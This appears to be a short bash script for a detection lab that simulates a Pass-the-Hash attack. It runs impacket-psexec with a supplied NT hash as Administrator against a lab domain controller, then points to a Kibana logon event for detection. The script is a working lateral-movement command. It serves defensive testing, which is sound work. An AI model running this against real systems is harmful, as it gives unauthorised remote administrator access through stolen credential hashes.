#!/bin/bash
# Attack Simulation: Pass-the-Hash
# MITRE ATT&CK: T1550.002
# Usage: ./pass_the_hash.sh <NT_HASH>
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="Administrator"
NT_HASH=${1:-"provide_nt_hash_here"}

echo "[*] Executing Pass-the-Hash attack against $DC_IP"
impacket-psexec -hashes ":${NT_HASH}" ${DOMAIN}/${USERNAME}@${DC_IP}

echo "[*] Attack complete - check Kibana for Event ID 4624 LogonType 3 with NTLM auth"
